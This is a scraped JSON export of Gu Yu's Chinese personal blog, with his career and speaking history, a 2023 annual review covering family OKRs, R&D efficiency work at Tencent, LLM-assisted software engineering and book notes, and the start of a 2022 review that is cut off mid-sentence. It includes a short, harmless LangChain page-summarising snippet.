[{"content":"你好，我是顾宇。腾讯 研发效能工程师，曾经作为咨询师和软件工程师为各行业客户提供数字化转型咨询服务。并在其中综合应用规模化敏捷（SAFe®）、领域驱动设计（DDD）、微服务架构、DevOps 和云原生技术。并在多年的咨询过程中积累了丰富的实践和教学经验。\n其它渠道 # 微信公众号: guyu_notes 简书 CSDN 博客 腾讯云+社区 InfoQ 职业经历 # 工作起止年月 工作单位 部门 职位 2022.03 - 至今 腾讯科技（深圳）有限公司 PCG 技术与内容平台 研发效能工程师 2021.01 - 2022.03 腾讯云 客户服务支持中心 解决方案资深顾问 2018.09 - 2020.12 埃森哲（中国）有限公司 企业创新服务部 技术咨询经理 2013.09 - 2018.09 ThoughtWorks 西安办公室 高级咨询师 2010.08 - 2013.09 亚信联创 乌鲁木齐分公司 高级软件工程师 2009.11 - 2010.08 华夏银行乌鲁木齐分行 信息技术部 科员 2009.04 - 2009.11 神州数码思特奇 乌鲁木齐 PSO 软件开发工程师 出版 #2022 年 - 《敏捷测试价值观、方法与实践》\n2022 年 - 《卓有成效的工程师》\n2020 年 - 《研发质量保障与工程效率》\n2017 年 - 《ThoughtWorks 洞见：微服务文集（二）》\n2016 年 - 《七周七 Web 框架》\n演讲和分享 #2024 年 #2023 年 # 日期 城市 活动 主题 2023-12-16 北京 中国软件技术大会 2023 LLM 辅助软件工程的探索和反思 2023-10-24 南京 NJSD 2023 LLM 辅助软件工程的实践和反思 2023-09-23 深圳 CSDI 中国软件研发创新科技峰会 技术战略下的研发效能演进策略 2023-05-12 深圳 QECon 全球质量\u0026amp;效能大会 技术战略下的研发效能度量 2023-03-18 广州 小红花技术沙龙 千人规模组织研发效能演进心得 2022 年 # 日期 城市 活动 主题 2022-12-07 线上 DevOps Meetup 如何让测试更好的助力 DevOps 2022-11-05 线上 破马张飞 S10E1 一书读懂敏捷测试 2022-08-20 深圳 K+ 全球软件研发行业创新峰会 微服务产品的规模化敏捷: 当SAFe遇到DDD 2021 年 #2020 年 #2019 年 # 日期 城市 活动 主题 2019-12-14 北京 中国软件技术大会 DevOps 的质量从用户故事开始 2019-11-16 北京 Top100Summit 千人规模团队 DevOps 改进 2019-10-26 北京 NCTS DevOps 的质量从需求质量开始 2019-09-22 深圳 敏捷之旅 DevOps 质量从用户故事开始 2019-07-06 北京 DOIS 微服务产品团队规模化 DevOps 演进模式 2019-06-23 深圳 DevOpsMeetup 千人规模 DevOps 组织演进模式 2019-05-23 香港 CloudExpo CloudNative DevOps 2018 年 # 日期 城市 活动 主题 2018-11-17 上海 CNUTCon 一次微服务架构决策的案例 2018-11-03 深圳 DOIS 云原生下的 DevOps 新实践 2018-11-27 深圳 腾讯云 从 DevOps 标准评估中我们学到了什么 2018-10-14 厦门 DevOpsMeetup 一个敏捷开发团队的 DevOps 之路 2018-10-13 福州 DevOpsMeetup 一个敏捷开发团队的 DevOps 之路 2018-09-12 台北 DevOpsDays 用 DevOps 故事落地 DevOps 实践 2018-09-02 广州 DevOpsMeetup 用 DevOps 故事落地 DevOps 实践 2018-07-21 西安 AgileTour 团队敏捷文化构建工作坊 2018-06-30 北京 DOIS 成功的微服务应该是什么样 2018-06-29 北京 DOIS 应用设计标准解读 2018-06-02 深圳 TechRadarSummit CloudNativeDevOps 2018-04-15 深圳 GOPS 2018 微服务落地反思以及高效落地 2017 年 # 日期 城市 活动 主题 2017-10-28 北京 TechNeo 用基础设施即代码自动化架构迁移 2017-10-21 厦门 MDP 微服务反思工作坊 2017-09-17 北京 JAM 大型团队 Jenkins 最佳实践分享 2017-08-18 上海 DevOpsDays 无服务器化的微服务持续交付 2017-07-29 北京 QingCloudInsight 当你的持续集成服务器成为安全隐患 2017-04-22 南京 NJSD 2017 打造你的 DevOps 技术雷达 2017-04-21 深圳 GOPS 2017 DevOps 可视化在电信企业的应用 2016 年 # 日期 城市 活动 主题 2016-12-17 西安 DevOpsMeetUp MicroService In Serverless 其它平台内容 #哔哩哔哩 # 如何让测试更好的助力 DevOps\n破马张飞 S10E04 一书读懂敏捷测试\nIT 大咖说 # CloudNative 时代的 DevOps 应该怎么做？\n大型团队 Jenkins 的构建最佳实践\n当持续集成服务器成为了安全关键隐患\nThoughtWorks 洞见 # 从技术雷达看 ​DevOps 的十年 - 容器技术和微服务\n从技术雷达看 DevOps 的十年 – 基础设施即代码和云计算\n从技术雷达看 DevOps 的十年 - DevOps 和持续交付\n讨论微服务之前，你知道微服务的 4 个定义吗？\nServerless 的微服务持续交付案例\nServerless 的微服务架构案例\n推进微服务落地的 7 个步骤\n微服务实施常被忽视的 5 个难点\n避免 CI 成为安全隐患\nDevOps 技术发展的 9 个趋势\n","date":"January 8, 2024","permalink":"/about/","section":"顾宇的博客","summary":"","title":"关于我"},{"content":" 本文是作者顾宇在2023年对自己一年生活的总结。文章主要分为四个部分：生活、工作、学习和阅读。\n在生活部分，作者介绍了家庭管理架构的演进，从家庭OKR到家庭战略，以及每月对家庭OKR的复盘。\n在工作部分，作者总结了在腾讯做技术战略的工作，包括延续去年的知识管理内容，以及今年开始进行研发效能的治理。\n在学习部分，作者介绍了使用GPT辅助学习和开发应用的经验，包括用SwiftUI写了一个全屏时钟，以及用LangChain开发了一个总结网页内容的程序。\n在阅读部分，作者分享了自己阅读的书籍，包括《让孩子的大脑自由》、《高效能家庭的7个习惯》等。\n总的来说，本文是作者对自己2023年生活的总结和反思，以及对未来的规划和展望。\n[生成结果用时：8.42秒]\n当父亲的第二年，开始很依恋和孩子相处的时光。看着他一天天长高，长大，睡去，醒来。\n我觉得带孩子对我来说是最治愈的事情，我很享受和他一起玩的时光，更享受一家三口在一起的日子。\n依照惯例，将我今年一年的生活汇报如下。\n生活 - 家庭管理架构 3.0 #年初我和太太共同（主要是她）设计了家庭管理架构 3.0，并且用以指导我们的家庭生活。\n在这里可以简单介绍下家庭管理架构的演进：\n家庭管理架构 1.0 就是纯粹的家庭OKR，以家庭目标为主，个人目标为辅。从家庭的视角来看待个人的一年规划。包括财务/健康/学习成长/工作。 家庭管理架构 2.0 在 1.0 的基础上增加了家庭文化。即家庭的使命、愿景、价值观和原则。并以此通过家庭文化来指导家庭 OKR 的落地。 家庭管理架构 3.0 在 2.0 的基础上增加了家庭战略。即 3-5 年的发展方向和规划。这是因为家庭文化更多是原则性的，而家庭战略更加具体，在我们当前的认知下对未来家庭生活的畅想，是对愿景的细化。 除此之外，我们还每个月对家庭 OKR 进行一次复盘，并制定下个月的 Task。使我们两个没有什么长性的人能够坚持做一些事情。今年坚持了 8 个多月的健身，包括早晚瑜伽和撸铁。见证自己身体上的变化。\n通过每月的家庭 OKR 回顾，我们对 OKR 有了新的认识和体验。让我们更好的在生活和工作上支持到对方。\n曾经在乌鲁木齐的一阳咖啡看到一句话：“把生活当做工作来做，把工作当做生活来过。”\n我们仍然觉得需要认真的对待家庭及其成员，家庭生活中难免争吵，通过我们的家庭管理框架可以帮我们做到更好的反思。\n工作 - 技术战略下的 GPT 和研发效能 #今年继续在腾讯做技术战略，大的范畴和方向没有变化，但工作的内容有些许的调整。\n延续 #延续去年的工作，技术战略的内容之一是知识管理。今年最大的收获之一是编辑了 PCG 内部的工程实践案例集，以及 Java，Go，C++ 的编程语言实践指南，收到广泛的关注。\n而去年花大力气做的领域驱动设计和需求分解方面的课程，今年没有机会继续，不得不说是一件很遗憾的事。\n变化 #今年的变化主要提现在两点：\n研究了 GPT 在研发效能领域的应用，积累了很多关于 GPT 的知识以及 LLM 辅助软件工程的经验。 开始进行研发效能的治理，主要是团队需求管理和产能方面的治理和度量。 技术战略下的 LLM #今年是 GPT 很火的一年，因此我也在大语言模型方面有一些新的探索和学习，并且针对研发效能方面做了一些行业扫描，涉及到软件工程的方方面面。\n此外，通过黑客马拉松编写了一些简单的应用，能够采用 GPT 开发一些应用帮助一些团队的工作提效。\n从技术战略上来看：\n如果没有核心算法、语料、算力。不要去训练大模型，ROI 不高。 由于大模型的加持，很多行业的边际成本大幅降低。会诞生很多的新的职业和公司来替代原来边际成本较高的。 以 AI 为核心的软件架构决定了软件工程，现有的软件工程领域的环节替代只是个过度阶段。 中美之间的地缘政治会长期阻碍中国人工智能的发展，我们要采用自己的模型，在自己的模型上构建应用。否则后期断供带来的迁移成本会很大。 当前的大模型（包括 GPT-4）远未达到通用人工智能（AGI）的水平。但是，对于某些误差容忍度较高的领域，大模型已经可以替代专家。 此外，受 Unit Mesh 的启发，我还进行了一个定性的研究 LLM 为核心的软件架构。\n定性的方向还是最大化使用 AI 来辅助软件工程。从软件工程的过程边际成本的变化来判断未来软件架构和软件工程的发展。\n有几个长期的约束必须要说明：\nLLM 的精度会越来越高，能力会越来越强。 算力会越来越便宜，但是 LLM 的训练成本会越来越低。 LLM 作为通用型的模型不能直接胜任领域问题，因此需要以 LLM 为基础，通过工程的方式增强领域问题的处理能力。 在 Cynefin 框架下，我们可以认为 LLM 已经把很多的繁杂和复杂的问题变成了简单问题。\n回到软件工程的本身，即《没有银弹》提出的本质复杂度和次要复杂度，以及《人件》所描述的“社会性问题”，可以得到一个大致的推理：\n由于问题域本身的复杂度（本质复杂度）在不断变高，软件会变得越来越复杂。 由于解决方案域的复杂度随着技术的发展变的更加低，随着从业人数的变多软件开发的成本会进一步见底。 由于人脑算力的不足，因此需要人与人协作来共同解决本质复杂复杂度和次要复杂度，这里最大的成本就是人与人的协作成本。 所以，当有了 LLM，其本身包含了本质复杂度和次要复杂度的解决方案，人类做的事情就是“提示”出解决方案并且进行验证。加之 LLM 的算力比人类强太多。因此，程序员的产能会进一步提升。相应的沟通成本会进一步降低。而南京大学软件学院的张贺更进一步进行了一些定量的研究，他认为 GPT 辅助软件开发已经可以被称之为“银弹”，能达到 30 倍的产能。可惜 Brooks 老爷子在世的时候没有看到 GPT-4，不知道他看见后会做如何感想。\n在我的研究中，有些事情是不可被AI替代的：\n对问题域的描述，使其变成可计算的问题。 对解决方案的验证。 对结果承担责任。 此外，我还采用“few shot”的方式产生了一些可以“直接执行”的需求，让人类完全不参与代码的编写，软件本身也要具备一定的智能。于是我用langchain开发了一个应用来做进一步的研究。\n基于我的研究，我认为 LLM “绞杀” 软件工程师的最可能路径如下：\n新的代码和采用需求 + Prompt 的方式生成。 遗留代码在 LLM 的辅助下进一步重构为职责单一的接口/类。并采用 Prompt 来对这些代码进行封装。 构建一个 Prompt 编排系统，将 GPT 生成的代码和遗留的代码。 最终，程序员不需要编写新的代码，取而代之的是编写 Prompt 并对 Prompt 产生的结果进行验证。\n不过，这看起来是产品和测试的工作。最终不是程序员被替代，而是产品和测试被替代。\n说实话，我不认为 GPT 在替代程序员，而是在解放程序员。在这里我用 Kend Beck 的一条推文作为结束：\n技术战略下的研发效能 #今年下半年开始治理内部团队的需求管理。核心问题有以下几点：\n团队产品形态不统一，Web/终端 的交付场景不同，因此没有统一的需求流转流程。部署方式的不通决定了发布模式的不同，To B 和 To C 的结束定义不通，也导致了定义“已完成”的不同。 采取一刀切的框架，之前进行的需求流转流程太细，对于小团队来说，流程太复杂，运作成本很高。 为了降低运作成本，又额外招聘了很多人开发了一堆工具来辅助需求流转，不但成本没降，反而增加了成本和浪费，且造成了一些很难消除的技术债。 以度量来考核，最后大家开始做一些无意义的内卷。 在治理过程中我不断采用 去年所提到的技术战略的角度来开展需求治理工作。从关键结果（KR）出发，结合公司的主要矛盾（降本增效）和上述的三点进行了逐步的治理。\n建立能够提现出要研发矛盾的模型，并基于该模型度量可观测指标。 循序渐进，小步快跑。在2-3个项目团队上得到了成功的经验，再逐渐推广到其它项目团队。 求同存异，先解决共性的问题，搁置特性的问题。 避免一刀切，先让团队接受最小的改动，然后逐步增加改动，减少对项目团队的打扰。 研发效能有三点反思：\n当出现新的技术时，要回头看看《人月神话》和《人件》关于软件工程中主要矛盾的论述。 研发效能一定要根据企业战略找到主要矛盾，建立模型度量主要矛盾，抓大放小，由粗入细，逐步进行。不要采用“大力出奇迹”的“运动式研发效能”增加不必要的消耗。 研发效能一定要先建设工具，后落地实践。否则会因为缺少工具大大影响实践落地效率和工作士气。还会产生很多不必要的浪费，让组织陷入混沌之中。 明年将会继续当前的工作，并尝试将研发效能的治理推广到全部团队。\n学习 - GPT 辅助学习 #借助于 GPT 的帮助，今年完成了一些很久之前想做但一直拖延的事情。\n小钟钟 - 用 SwiftUI 写了一个全屏时钟 #一直都想开发一个番茄钟之类的 iOS App，以往很多简单的小应用都找不到了。一直想要开发但一直都很难启动。直到遇到了 GPT，抱着试一试的想法，开发了这么一个简单的应用。\n结果我发现两天就搞定了，但进行图标设计和 TestFlight 上发布时花了三四天。\n由于这个 App 太简单，代码不超过 100 行。上架应该难以过审。因此这个应用还在 TestFlight 里供家人使用，效果如下：\n等明年有机会的时候再继续开发吧，学习 iOS 编程是主要目的。在这个过程中不断对架构/产品设计/软件工程的概念进行反思和优化。手头总得有个 MVP 可以帮你验证某些理论和想法。\ntldr.ai - 用 LangChain 帮我做到“太长；不读” #GPT 的火热带动了软件开发的发展，特别是 LangChain这个开发框架。\n在研究 GPT 在软件工程领域的应用时每天都有新的项目和模型发布，且大部分采用英文。\n我要花大量的时间阅读和理解。因此，我采用 Langchain 和 ChatGLM 模型开发了一个帮我用中文总结网页内容的程序，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 from langchain.chains import LLMChain from langchain.llms import ChatGLM from langchain.prompts import PromptTemplate from langchain.document_loaders import AsyncHtmlLoader from langchain.document_transformers import Html2TextTransformer def tldr(url: str) -\u0026gt; str: loader = AsyncHtmlLoader(url) html = loader.load() html2text = Html2TextTransformer() page = html2text.transform_documents(html) template = f\u0026#34;{page} 介绍了 {url}, 请用中文介绍什么是 {url}。\u0026#34; llm = ChatGLM( endpoint_url=\u0026#34;http://127.0.0.1:8000\u0026#34;, max_token=80000, top_p=0.9, temperature=0.01, model_kwargs={\u0026#34;sample_model_args\u0026#34;: False}, ) prompt_template = PromptTemplate(template=\u0026#34;{prompt}\u0026#34;, input_variables=[\u0026#34;prompt\u0026#34;]) llm_chain = LLMChain(llm=llm, prompt=prompt_template) return llm_chain.run(template) 你可以采用 chatglm.cpp在本地搭建一个 ChatGLM3-6b 的模型运行上述代码。\n明年应该会把这个程序开源。并且附带上我的一些研究成果。\n出版和写作 #去年下半年和几位质量和研发效能领域的老师一起共同编写一本测试相关的书，今年年中我完成了我的章节。不知道后续是否有机会出版。\n由于工作比较忙，生活的时间大部分都给了宝宝。因此，今年写的内容较小。大部分变成了自己 iPhone 备忘录里的笔记。\n但是，“输出驱动输入”的学习方式没有变，还是通过几次线下技术分享来总结去年和今年的心得和学习成果。\n线下分享 #疫情恢复后，今年又在线下做了几次分享。\n小红花技术沙龙 - 千人规模组织研发效能演进心得 #今年的第一个邀请来自广州小红花技术沙龙。虽然话题是 2019 年在北京Top 100 峰会上的旧话题，但是角度和深度以大大不同。从技术战略的角度来看大型组织的研发效能演进。\n新增加的内容有三点：\n研发效能的“效能”指的业务收益，这里面包含三个变量：业务价值（质量），交付成本，交付速度。要想达到价值最大化，就要平衡质量/速度所耗费的成本。 软件的产值是难以估计的，只能通过约束成本来最大化软件特性的边际收益。 软件架构的解耦可能是研发效能演进的最后一个瓶颈。大型的软件项目只有通过架构解耦来提升研发效能，以通过增加人数来扩大需求吞吐量。 研发效能问题看起来是一个技术问题，但技术问题的背后是管理问题，管理问题背后是利益问题，利益问题的背后是价值观问题。如果价值观不统一，那么利益问题便难以调节，最后导致全局协同失败。因此，看不到组织的利益问题和价值观的不同的研发效能改进就很难成功。 QECon 全球质量\u0026amp;效能大会 - 技术战略下的研发效能度量 #小红花技术沙龙分享后不久，就接到茹炳晟老师的邀请。在 5 月份的 QECon 深圳站上进行研发效能度量方面的分享。\n接着小红花技术沙龙的上的关于业务收益的观点，我进一步介绍了技术战略是如何看待研发中的知识度量。因为，在软件行业是知识在创造价值。这些知识包括：代码、文档和数据。\n正如我在小红花技术沙龙上的观点“软件的产值是难以估计的，只能通过约束成本来最大化软件特性的边际收益。”\n因此只能管理成本而非收益，而知识管理的成本可以进一步分为以下三类：\n知识的采购成本：招聘工程师/设计师/产品经理的成本 知识的创造成本：开发软件的成本 知识的维护成本：代码/文档/数据的维护成本。这里面最关键的是代码的维护成本。 这三个成本相互制约，任何企业最初的时候，都是用较小的成本来采购和创造软件的。随着企业和软件的复杂，对应的维护成本不断攀升，特别是技术债的出现。造成了知识的采购、创造成本不断增加。因此，最好的策略实际上是对代码（特别是架构）、文档（特别是需求）的治理。在腾讯 PCG 有代码质量评审作为晋级的激励，加强了正向的激励作用。并成立了代码委员会来负责代码质量的建设工作。主要包括：\n制定代码评审细则和编程手册，统一对代码质量的认知。 通过培训/考试对程序员编程水平进行分级，并进行分级管理。 作为晋级激励的方式来鼓励程序员提升代码的质量。 设计了工具帮助团队度量和改进代码。 通过技术活动运营来宣传和推广代码质量。 对于代码质量，我们的度量包括：\n通过考试的中级/高级程序员在团队内部的占比。 技术债/复杂度/代码规范分的度量。 优质/有效 代码评审的数量占比。 而对于产品线上的度量，则主要是以用户满意度，MTTR，MTBF 来衡量。这些结果指标可以进一步帮助团队改进代码/架构以达到最终的效果。目的还是为了降低软件的维护/运营成本。因为软件在运营/维护期才产生价值。\nCSDI 中国软件研发创新科技峰会 - 技术战略下的研发效能演进策略 #借由 QECon 的机会认识到了董笑含老师，能够让我继续分享技术战略和研发效能的话题。很可惜的是，这次的分享时间不足。\n这次分享的核心是完善后的技术战略框架，包含三个层次，如下图所示\n技术战略金字塔\n其次是利用这个框架构建出研发效能的相关模型，特别是对现状的分析。\n接下来就是根据现状、趋势和目标设计出成本最小的演进策略。\n最后是通过三个我的客户的例子，来解释如何运用这个框架来指导不同研发效能的改进。有时候同样的事情，在不同阶段的企业上，会得到相反的效果。\n南京软件开发大会 2023 - LLM 辅助软件工程的实践和反思 #在研究 LLM 辅助软件工程的时候，主要参考了加入了黄峰达老师发明的UnitMesh架构及其相应的工具包，同时加入了“AI 研发提效”微信群。\n也是在交流沟通的过程中又遇到了南京软件开发大会的人群老师，邀请我去南京做交流。这次主要是分享我在工作中对 LLM 辅助软件工程的一些思考和经验。\n简单介绍了一下我在腾讯看到的 AI 辅助软件工程的项目和效果。\n主要的篇章还是讲到UnitMesh架构的实践以及对软件工程启示。\n对于基于 LLM 应用的开发，我认为有以下关键问题有待进一步研究：\n数据集质量和人类表达精度决定了 LLM 适用的场景不会要求太高。只要能超过人类的误差即可。 Prompt 调试的反馈周期较长（包括 LLM 的推理性能，准确性，采纳率） Prompt 的质量导致了结果的质量。因此对于 Prompt 的质量评估仍然面对很大的不确定性。 Prompt 在不同模型之间的兼容性（自言语言、参数数量）是需要提上日程的，否则对于模型的依赖，以及迁移成本都会很大。 Token 的数量限制了问题的复杂程度。 算力限制导致了相关成本还是很高，未来除非有新的技术突破。否则 SaaS 是 GPT 更经济的场景。 中国软件技术大会 2023 - LLM 辅助软件工程的探索和反思 #这次分享的内容和南京的分享差异不大。只是例子从 ChatGLM2 换成了 ChatGLM3，并且减少了传统软件工程方面的 AI 辅助研究。\n上一次参加中国软件技术大会是 2019 年，认识了温昱老师，吴言老师（后来还成为了同事）并和倪光南院士合影。\n这次除了遇到了一些老朋友，还结识了新的朋友。\n特别是有幸听到付晓岩老师的生成式架构相关的分享，这进一步启发了我对架构和人工智能辅助软件工程的认识:\n在 LLM 时代下，架构是一种对复杂任务的拆解，而架构的生成则是让 LLM 做这件事，从而降低架构这一复杂劳动的成本，得到更合理的软件架构。\n阅读 #今年计划阅读的图书以战略和家庭治理为主。\n让孩子的大脑自由 # 豆瓣评分：8.5\n这本书主要讲如何养育孩子的一些原则以及相应的科学依据，这是我今年读完的第一本书。本书系统的讲授了如何养育孩子。这本书所介绍的内容也成为了我们家育儿方面的原则。本书的核心内容是共情和理解，我们要站在孩子的角度来思考他的问题，而不是我们的角度。这样可以避免很多无效的教育和不必要的情绪。\n高效能家庭的7个习惯 # 豆瓣评分：8.0\n这本书是关于家庭成员之间如何相处的，我们家已经在默默采用这些原则指导我们的生活了。可以看作是“高效能人士的七个习惯”的家庭版。七个习惯名称没有变，只是举例和应用的时候采用的更多的是家庭的例子。我想高效能的人士和家庭是密不可分的，且这些原则是通用的。\n如果你和伴侣、父母、孩子的关系手忙脚乱，建议你看一下这本书。\n最好的告别 # 豆瓣评分：9.0\n这本书我买了 4 年，终于在今年春节的时候把它读完了。本书主要介绍了两方面内容：\n更好的养老方案：衰老不可避免，我们要有幸福感的迎接最后的日子。 临终关怀 over ICU治疗：我们应当给予有尊严的死亡。虽然两者的手段一致，但目标不同。 死亡总是一个意外，它突然发生，带走我们身体的一部分。我们应该准备好一个应急预案，安排好我们死亡后所要处理的事情。毕竟，这是你目前唯一能做的。\n如果可能，我建议你也和你的父母认真严肃的讨论这些问题，让我们遇到这一切的时候，不会慌张。也能够让我们更好的珍惜当下所拥有的。\n饮食术 - 风靡日本的科学饮食教科书 # 豆瓣评分：7.4\n这本书传说是张展晖教练给徐小平推荐的瘦身书，不是很推荐，我大概花了两小时就看完了。\n这本书主要就讲两点：1. 控制血糖的稳定，不要忽高忽低。 2. 食用优质脂肪。\n今年健身期间通过 8+16 轻断食维持摄入，体重一直有序增加且体脂没有显著增加。但是在 10 月抱娃背部受伤后，就放纵了一个月。10 月底体检后发现自己血脂和体脂已经超标了，于是又启动了之前的每周两天轻断食方案，俗称 2+5，即 2 天摄入热量少于 600 大卡（女生 500 大卡），剩下日子随便吃。\n在夫人的要求下，周末不允许我轻断食，一定要和她一起吃好的。因此我基本上是周一周二轻断食一天，周四周五轻断食一天。保证两次断食中间有 2-3 天。在进食日保证自己有足够的有氧运动（目前主要是跳绳）。\n断食日的食物也基本固定：玉米、红薯、煮鸡蛋、牛奶/豆浆。分量保证在 600 大卡之内，一天在饿的时候分散吃完，这样饥饿的压力就小了。\n坚持不住怎么办？我的办法是打开小红书，找到断食网红，看他们的断食故事励志，两周就可以控制住。因此我在今年的最后一个月成功控制住了体脂，从 22% 现在 21%。明年年底的目标是体脂降到 15% ，平均每个月降低 0.5 %。\n芒格之道 # 豆瓣评分：9.3\n这本书也是我在同一时间看到的，很厚，于是加入了微信阅读书架。直到年底得知芒格去世后才开始看。我基本上用了一周的睡前三小时（22:00 - 1:00）读完了这本书。这本书基本上是芒格在西科金融股东会和每日期刊股东会上的讲话稿而成。相较于《穷查理宝典》（我仍然没读完），这本书更加轻松幽默，特别是对待投资、人生、经济三方面的话题上，他的智慧让人印象深刻。\n不知道是不是因为年龄还是当前的阶段，我更喜欢看这类人生智慧的书。\n置身事内：中国政府与经济发展 # 豆瓣评分：9.1\n这本书第一次系统的通过案例的形式讲述了中国的经济运行的内在逻辑。能让我更好的理解中国政府在经济活动中如何起作用，起了什么样的作用。这也是作者和政府打交道长时间以来的总结。知识密度很高，适合作为工具书反复阅读。\n此外同类的书我还买了温铁军老师的《八次危机》，还未读完，就不在这里分享了，希望明年可以读完，届时给大家分享。\n开源项目 #chatglm.cpp #如果你想在本地 MacBook 上运行 ChatGLM-6B、ChatGLM2-6B、ChatGLM3-6B 或其他大型语言模型，可以采用 chatglm.cpp。\nChatGLM.cpp 是一个基于 C++ 实现的 ChatGLM-6B、ChatGLM2-6B、ChatGLM3-6B 和其他大型语言模型（LLMs）的库，用于在您的 MacBook 上进行实时聊天。该库的主要特点包括：\n纯 C++ 实现，与原始的 Hugging Face ChatGLM(2)-6B 工作方式相同。 加速的内存高效的 CPU 推理，通过 int4/int8 量化、优化的 KV 缓存和并行计算实现。 支持流式生成，具有打字机效果。 提供 Python 绑定、Web 演示、API 服务器等更多可能性。 ChatGLM.cpp 支持多种硬件平台，包括 x86/arm CPU、NVIDIA GPU 和 Apple Silicon GPU。它可以在 Linux、MacOS 和 Windows 等平台上运行。目前支持的语言模型包括 ChatGLM-6B、ChatGLM2-6B、ChatGLM3-6B、CodeGeeX2、Baichuan-13B、Baichuan-7B、Baichuan-13B、Baichuan2、InternLM 等。\nChatGLM.cpp 还提供了 API 服务器、Python 绑定、Web 演示等功能，方便集成到各种前端应用中。此外，ChatGLM.cpp 还支持在 Docker 中运行，提供了预构建的 Docker 镜像，方便部署和运行。\n总之，ChatGLM.cpp 是一个功能丰富、易于使用的 C++ 库，用于在各种平台上实现大型语言模型的聊天功能。\n[生成结果用时：13.25秒]\nUnit Mesh # Unit Mesh是一种基于人工智能生成的分布式架构，与传统的分布式架构不同，Unit Mesh 中的服务单元 (Unit) 是由 AI 生成的，应用程序中的服务和数据抽象为一个个独立的单元，并通过统一的控制平面进行管理和部署。\nUnit Mesh 不光是一种 GPT 的生成式架构风格，更演化出了一堆与生成式 AI 相关的开源项目，作者黄峰达非常高产。我经常笑话他是挖坑大神，没想到人家把坑连起来挖成了一条运河。\n我很认可他的观点和方向，因为我总是在独立研究 3 个月之后才理解他所做的事情。明年继续保持关注和投入。\n明年的计划 #明年的工作繁忙程度可能会更高，但我仍然想能够多产出一些内容。及时记录及时发表。明年能够确定的目标如下：\n编程不停，通过实践进一步掌握 LLM 相关技术。 减少线下分享，明年最多两次。 增加内容的输出，保持每个季度不少于一篇。 最后 #好了，大概十几篇博客的内容都汇集在这一篇里了，希望其中的观点可以帮助到您。\n新的一年开始了，在这里，我祝您事事愿意，享受当下。\n","date":"December 31, 2023","permalink":"/blog/2023/2023-12-31-annual-review-for-2023/","section":"Blogs","summary":"","title":"2023年的总结"},{"content":"","date":null,"permalink":"/blog/","section":"Blogs","summary":"","title":"Blogs"},{"content":"","date":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":null,"permalink":"/","section":"顾宇的博客","summary":"","title":"顾宇的博客"},{"content":"","date":null,"permalink":"/tags/%E5%85%B6%E5%AE%83/","section":"Tags","summary":"","title":"其它"},{"content":"没有想到自己会是在新冠康复的一周内总结2022年，希望新冠病毒和2022年一起和我别过。\n2022 年定会是历史上标志性的一个年份，世界历史的进程就此转折。俄乌战争爆发、英女王去世、江泽民去世。一个又一个时代落幕，同时也是一个又一个新时代的兴起。\n对我来说最重要的是我儿子的出生，我成为了一位父亲。\n1986年，我出生的时候，阿根廷世界杯夺冠。36年后，我儿子出生，阿根廷再次夺冠。这种有意思的巧合\n此外，今年做了一次线下分享，出版了两本书。在如此动荡的年份里有如此获得，对于本命年的我，已算知足。\n2022 年的生活/工作/阅读/写作/开源软件 方面的事情简单介绍一下。\n生活 —— 家庭文化 和 OKR 牵引的一年 #2022 年参考了夫人企业文化和OKR 框架实践了我们的家庭文化和OKR。\n企业文化，具体点就是使命、愿景和价值观。家庭亦然，经过一周的提问和分享，我们总结以下的家庭文化。\n我们的家庭使命是：用爱滋养生命，使生命得到绽放。\n我们的家庭愿景是：经营并传承一个健康快乐、有爱温暖、认真生活的家庭。\n我们的家庭价值观是：温柔乐观；简单真实；尊重谦逊。\n重要的是如何践行家庭文化，否则就和企业文化一样，成了一些口号。\n家庭文化规范着家庭成员的行为，我们彼此认同，且相互监督。并通过 OKR 落实到家庭生活的每个一环节中。这就是我们认为的“认真生活”的文家庭文化。\n建立家庭文化的过程需要夫妻双方关于“想要一个什么样的家庭”的一次深度的沟通，包括对双方父母，对子女的进一步的构想法。\n有了家庭文化之后，我们发现家庭可以减少里的争论少了很多，由于双方的认可和监督，减少了很多的争吵和矛盾。即便会出现一些争吵，也会很快化解，毕竟有些习惯难以改掉，但只要包容就好，这就是我们认为的“有爱温暖”。\n反思企业文化也是如此，越是大的企业越无法靠制度去规范方方面面，否则管理成本太高。只有以简单而明确的观念才更利于记忆和传播，因为大脑本身就不是很喜欢太复杂的东西。\n围绕着家庭文化，我们同样制定了家庭的OKR，主要包括三个O（目标）：\n顺利迎接家庭新成员。 践行家庭使命愿景，持续成长，共建幸福家庭。 家庭资产稳健增长。 具体的KR 以及需要完成的 Task 散落在每月1日的学习及其对 OKR 的回顾中，随着不断的反思讨论越来越熟练。刚开始的时候可能需要2-3天抽空复盘完。后来只需要一杯咖啡的时间就可以完成复盘，当然，越到年底，没完成的内容就越少。\n总的来说今年的各项 O 都按计划完成。明年将改进 OKR 体系，刚好元旦假期就来做这件事。\n明年也有计划和夫人一起写一写“家庭OKR”系列，有可能叫“幸福家庭战略”，希望能够帮助大家建立幸福美满的家庭。\n工作 —— 技术战略 #今年在腾讯的工作经历了一些变动，这是执行家庭 OKR “顺利迎接家庭新成员” 这一目标的一部份。\n由于需要照顾太太和孩子，不能出差。我从之前关注产业互联网的CSIG（腾讯云与智慧产业事业群）转到了 PCG（平台与内容事业群）。\n去年是腾讯云相关的上云咨询业务，面向的是腾讯云的客户。今年则是面对腾讯内部开展一系列以研发效能为主的技术战略工作。\n让我对技术战略有了自己的理解和认识。\n从广义上来说，技术战略是在有限的认知下为企业的持续发展制定并执行技术规划。并根据认知的演进不断的调整当下的决策。\n本质上，互联网公司也算是信息服务业。软件是通过编程语言利用计算机网络的计算、存储、传输能力解决领域问题，从而产生知识。\n而信息技术的本质是知识，而知识又需要人创造和维护，这个过程中就涉及到知识和人的投资组合和风险管理。\n无论哪种软件企业，都会在三类知识：行业知识、专业知识、企业知识。我把它称之为“三业模型”\n企业在不断采用软件专业的知识解决行业问题以产生经济效益，从中收取服务费用。无论是 To B / To C 